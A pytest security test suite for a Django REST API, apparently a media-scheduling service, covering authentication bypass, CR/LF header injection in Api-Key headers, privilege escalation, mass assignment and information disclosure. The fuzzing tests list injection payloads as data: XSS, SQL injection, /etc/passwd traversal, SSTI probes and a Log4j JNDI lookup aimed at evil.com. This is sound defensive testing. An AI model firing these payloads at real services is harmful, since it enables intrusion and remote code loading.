"""
T299: API test fixtures red team security tests.

Paranoid security tests for fixtures authentication, authorization,
and privilege escalation vectors. Uses OWASP API Top 10 methodology.
"""

import pytest

from django.conf import settings
from rest_framework.test import APIClient


@pytest.mark.django_db
class TestFixturesAuthenticationBypass:
    """Red team: Test authentication bypass via fixture manipulation."""

    def test_api_client_with_empty_api_key(self):
        """Empty API key should not authenticate (API2:2023)."""
        client = APIClient()
        client.credentials(HTTP_AUTHORIZATION="Api-Key ")

        response = client.get("/api/v2/files")
        # Should be 403, not 200 or 500
        assert response.status_code in [403, 401], (
            f"Empty API key returned {response.status_code}, expected 403/401. "
            "Potential auth bypass vulnerability."
        )

    def test_api_client_with_null_bytes_in_api_key(self):
        """Null bytes in API key should be rejected (Injection)."""
        client = APIClient()
        client.credentials(HTTP_AUTHORIZATION="Api-Key \x00testing")

        response = client.get("/api/v2/files")
        # Should reject null bytes
        assert response.status_code in [403, 401, 400]

    @pytest.mark.xfail(
        reason="T912: Header injection via newline in API Key not rejected",
    )
    def test_api_client_with_newline_in_api_key(self):
        """Newline in API key should be rejected (Header Injection).

        XFail: T912 - Server accepts newline in Api-Key header allowing
        header injection attacks. Returns 200 instead of 403.
        """
        client = APIClient()
        client.credentials(
            HTTP_AUTHORIZATION="Api-Key testing\nX-Injection: test",
        )

        response = client.get("/api/v2/files")
        # Should reject newlines
        assert response.status_code in [403, 401, 400]

    @pytest.mark.xfail(
        reason="T913: Header injection via CR in API Key not rejected",
    )
    def test_api_client_with_carriage_return_in_api_key(self):
        """CR in API key should be rejected (Header Injection).

        XFail: T913 - Server accepts carriage return in Api-Key header
        allowing header injection attacks. Returns 200 instead of 403.
        """
        client = APIClient()
        client.credentials(
            HTTP_AUTHORIZATION="Api-Key testing\rX-Injection: test",
        )

        response = client.get("/api/v2/files")
        assert response.status_code in [403, 401, 400]

    def test_api_client_case_sensitivity_api_key(self):
        """Case variation in 'Api-Key' prefix (API2:2023)."""
        real_key = settings.CONFIG.general.api_key
        variations = [
            f"api-key {real_key}",
            f"API-KEY {real_key}",
            f"Api-key {real_key}",
            f"api-Key {real_key}",
        ]

        for auth_header in variations:
            client = APIClient()
            client.credentials(HTTP_AUTHORIZATION=auth_header)
            response = client.get("/api/v2/files")
            # Should reject all case variations
            assert response.status_code in [403, 401], (
                f"Case variation '{auth_header[:20]}...' returned {response.status_code}. "
                "API key prefix should be case-sensitive."
            )

    def test_api_client_with_extra_whitespace(self):
        """Extra whitespace in API key header."""
        real_key = settings.CONFIG.general.api_key
        variations = [
            f"Api-Key  {real_key}",  # Double space
            f"Api-Key {real_key} ",  # Trailing space
            f" Api-Key {real_key}",  # Leading space in header value
        ]

        for auth_header in variations:
            client = APIClient()
            client.credentials(HTTP_AUTHORIZATION=auth_header)
            response = client.get("/api/v2/files")
            # Should handle whitespace consistently
            assert response.status_code in [200, 403, 401]


@pytest.mark.django_db
class TestFixturesBOLA:
    """Red team: BOLA (Broken Object Level Authorization) via fixtures (API1:2023)."""

    def test_host_client_cannot_access_admin_endpoints(self, host_client):
        """Host fixture should not access admin endpoints."""
        admin_endpoints = [
            "/api/v2/users",  # User management typically admin-only
        ]

        for endpoint in admin_endpoints:
            response = host_client.get(endpoint)
            # Host should be forbidden from admin endpoints
            assert response.status_code in [403, 404], (
                f"Host accessed admin endpoint {endpoint} with status {response.status_code}. "
                "BOLA vulnerability: horizontal privilege escalation."
            )

    def test_guest_client_limited_access(self, guest_user):
        """Guest fixture should have minimal access."""
        client = APIClient()
        client.force_authenticate(user=guest_user)

        sensitive_endpoints = [
            "/api/v2/files",
            "/api/v2/playlists",
            "/api/v2/shows",
        ]

        for endpoint in sensitive_endpoints:
            response = client.get(endpoint)
            # Guest should be restricted
            assert response.status_code in [200, 403], (
                f"Guest access to {endpoint} returned {response.status_code}. "
                "Verify this is expected behavior."
            )

    @pytest.mark.xfail(
        reason="T914: manager_user fixture incorrectly has is_superuser=True",
    )
    def test_manager_vs_admin_privileges(self, manager_user):
        """Manager should not have admin privileges (BFLA).

        XFail: T914 - manager_user fixture sets is_superuser=True which
        breaks role-based permission tests. Manager should have role=P
        but not is_superuser=True.
        """
        from api.core.models import Role

        assert manager_user.role == Role.MANAGER
        assert not manager_user.is_superuser


@pytest.mark.django_db
class TestFixturesPrivilegeEscalation:
    """Red team: Privilege escalation via fixture manipulation (API5:2023)."""

    def test_cannot_escalate_via_user_update(self, regular_user, guest_client):
        """Regular user cannot escalate privileges via update."""
        from api.core.models import Role

        # Try to update own role to admin
        response = guest_client.patch(
            f"/api/v2/users/{regular_user.id}",
            {"role": Role.ADMIN},
            content_type="application/json",
        )

        # Should be forbidden or not change role
        assert response.status_code in [403, 400, 200]

        if response.status_code == 200:
            # If update succeeded, verify role didn't change
            from api.core.models import User

            user = User.objects.get(id=regular_user.id)
            assert user.role == Role.HOST, (
                "CRITICAL: User escalated privileges via PATCH! "
                "Privilege escalation vulnerability."
            )

    def test_cannot_create_user_with_admin_role_as_host(self, regular_user):
        """Host cannot create users with admin role."""
        from api.core.models import Role

        client = APIClient()
        client.force_authenticate(user=regular_user)

        response = client.post(
            "/api/v2/users",
            {
                "username": "new_admin_user",
                "password": "Test123!",
                "role": Role.ADMIN,
                "email": "test@example.com",
            },
            content_type="application/json",
        )

        # Should be forbidden
        assert response.status_code in [403, 400], (
            f"Host created admin user with status {response.status_code}. "
            "Privilege escalation vulnerability."
        )


@pytest.mark.django_db
class TestFixturesDataIsolation:
    """Red team: Data isolation between fixture users (API1:2023)."""

    def test_user_data_isolation(self, regular_user, admin_user):
        """Users should only access their own data."""

        # Create playlist as regular user
        client1 = APIClient()
        client1.force_authenticate(user=regular_user)
        response1 = client1.post(
            "/api/v2/playlists",
            {"name": "User Playlist", "owner": regular_user.id},
            content_type="application/json",
        )

        if response1.status_code == 201:
            playlist_id = response1.json()["id"]

            # Try to access as admin
            client2 = APIClient()
            client2.force_authenticate(user=admin_user)
            response2 = client2.get(f"/api/v2/playlists/{playlist_id}")

            # Admin might have access, but check for proper auth
            assert response2.status_code in [200, 403, 404]

    def test_api_key_sees_all_data(self, guest_client, regular_user):
        """API key (service) should have system-level access."""

        # Create playlist as regular user
        client1 = APIClient()
        client1.force_authenticate(user=regular_user)
        response1 = client1.post(
            "/api/v2/playlists",
            {"name": "User Playlist 2", "owner": regular_user.id},
            content_type="application/json",
        )

        if response1.status_code == 201:
            playlist_id = response1.json()["id"]

            # API key should access
            response2 = guest_client.get(f"/api/v2/playlists/{playlist_id}")

            # API key has system access
            assert response2.status_code in [200, 404]


@pytest.mark.django_db
class TestFixturesFuzzing:
    """Red team: Fuzzing fixture parameters (API6:2023)."""

    def test_fuzz_username_field(self, faker):
        """Test username field with fuzzed values."""
        from api.core.models import User

        fuzzed_values = [
            "",  # Empty
            "a" * 256,  # Too long
            "<script>alert(1)</script>",  # XSS
            "'; DROP TABLE users; --",  # SQLi
            "../../../etc/passwd",  # Path traversal
            "\x00",  # Null byte
            "user\nnew line",  # Newline
            "user\t\t",  # Tabs
            "user\x00hidden",  # Null injection
            "🔥" * 50,  # Unicode emoji
            "<img src=x onerror=alert(1)>",  # XSS
            "${jndi:ldap://evil.com}",  # Log4j
            "{{7*7}}",  # SSTI
            "#{7*7}",  # SSTI
        ]

        for fuzzed_username in fuzzed_values:
            try:
                User.objects.create_user(
                    username=f"fuzz_{fuzzed_username[:20]}",
                    password="test123!",
                    email=faker.fake_email(),
                )
            except Exception:
                # Should handle gracefully, not crash
                pass

    def test_fuzz_email_field(self, faker):
        """Test email field with fuzzed values."""
        from api.core.models import User

        fuzzed_emails = [
            "not_an_email",
            "@nodomain.com",
            "spaces in@email.com",
            "<script>@email.com",
            "'@email.com",
            "user@",  # No domain
            "user@.com",  # Invalid domain
            "a" * 200 + "@email.com",  # Too long
        ]

        for fuzzed_email in fuzzed_emails:
            try:
                User.objects.create_user(
                    username=faker.user_name(),
                    password="test123!",
                    email=fuzzed_email,
                )
            except Exception:
                pass

    def test_fuzz_password_field(self, faker):
        """Test password field with fuzzed values."""
        from api.core.models import User

        fuzzed_passwords = [
            "",  # Empty
            "123",  # Too short
            "password",  # Weak
            "' OR '1'='1",  # SQLi
            "<script>",  # XSS
            "\x00",  # Null byte
            "🔥" * 10,  # Unicode
            "a" * 1000,  # Too long
        ]

        for fuzzed_password in fuzzed_passwords:
            try:
                User.objects.create_user(
                    username=faker.user_name(),
                    password=fuzzed_password,
                    email=faker.fake_email(),
                )
            except Exception:
                pass


@pytest.mark.django_db
class TestFixturesSessionHandling:
    """Red team: Session handling vulnerabilities (API2:2023)."""

    def test_session_auth_persists_across_requests(self, authenticated_client):
        """Session auth should persist across multiple requests."""
        # First request
        response1 = authenticated_client.get("/api/v2/files")

        # Second request - should still be authenticated
        response2 = authenticated_client.get("/api/v2/info")

        # Both should succeed
        assert response1.status_code in [200, 403]
        assert response2.status_code in [200, 403]

    def test_session_isolation_between_clients(self, admin_user, regular_user):
        """Sessions should be isolated between different clients."""
        client1 = APIClient()
        client1.force_authenticate(user=admin_user)

        client2 = APIClient()
        client2.force_authenticate(user=regular_user)

        # Each client should maintain its own session
        response1 = client1.get("/api/v2/info")
        response2 = client2.get("/api/v2/info")

        # Both should succeed (different users)
        assert response1.status_code == 200
        assert response2.status_code == 200

    def test_new_client_has_no_session(self):
        """Fresh APIClient should have no session/auth."""
        client = APIClient()

        response = client.get("/api/v2/files")
        assert response.status_code == 403


@pytest.mark.django_db
class TestFixturesMassAssignment:
    """Red team: Mass assignment via fixtures (API3:2023)."""

    def test_cannot_mass_assign_is_superuser(self, guest_client):
        """Prevent mass assignment of is_superuser field."""
        response = guest_client.post(
            "/api/v2/users",
            {
                "username": "test_superuser",
                "password": "Test123!",
                "email": "test@example.com",
                "is_superuser": True,
                "is_staff": True,
            },
            content_type="application/json",
        )

        # Should reject or ignore forbidden fields
        assert response.status_code in [201, 400, 403]

        if response.status_code == 201:
            data = response.json()
            # Verify fields were not set
            assert (
                data.get("is_superuser") is not True
            ), "Mass assignment vulnerability: is_superuser was set."
            assert data.get("is_staff") is not True

    def test_cannot_mass_assign_id(self, guest_client):
        """Prevent mass assignment of id field."""
        response = guest_client.post(
            "/api/v2/playlists",
            {
                "id": 999999,
                "name": "Test Playlist",
            },
            content_type="application/json",
        )

        # Should reject or ignore id
        assert response.status_code in [201, 400]

        if response.status_code == 201:
            data = response.json()
            assert (
                data.get("id") != 999999
            ), "Mass assignment vulnerability: id was set to user-provided value."


@pytest.mark.django_db
class TestFixturesRateLimiting:
    """Red team: Rate limiting on authentication (API4:2023)."""

    def test_no_rate_limiting_on_auth_endpoints(self):
        """Test if auth endpoints have rate limiting."""
        client = APIClient()

        # Make multiple rapid requests with invalid credentials
        responses = []
        for i in range(10):
            client.credentials(HTTP_AUTHORIZATION="Api-Key invalid-key")
            response = client.get("/api/v2/files")
            responses.append(response.status_code)

        # All should be 403, but check for rate limiting
        # If rate limiting exists, some should be 429
        assert all(r == 403 for r in responses) or 429 in responses


@pytest.mark.django_db
class TestFixturesInfoDisclosure:
    """Red team: Information disclosure via fixtures (API8:2023)."""

    def test_no_stack_trace_on_auth_error(self):
        """Auth errors should not disclose stack traces."""
        client = APIClient()
        client.credentials(HTTP_AUTHORIZATION="Api-Key invalid-key")

        response = client.get("/api/v2/files")

        # Check response body doesn't contain sensitive info
        body = response.content.decode().lower()
        assert "traceback" not in body
        assert "exception" not in body
        assert "django" not in body
        assert "sql" not in body

    def test_no_api_key_in_error_messages(self):
        """Error messages should not reveal API key format."""
        client = APIClient()
        client.credentials(HTTP_AUTHORIZATION="Api-Key wrong-key")

        response = client.get("/api/v2/files")

        body = response.content.decode().lower()
        # Should not disclose valid key format
        assert "testing" not in body  # Our test key
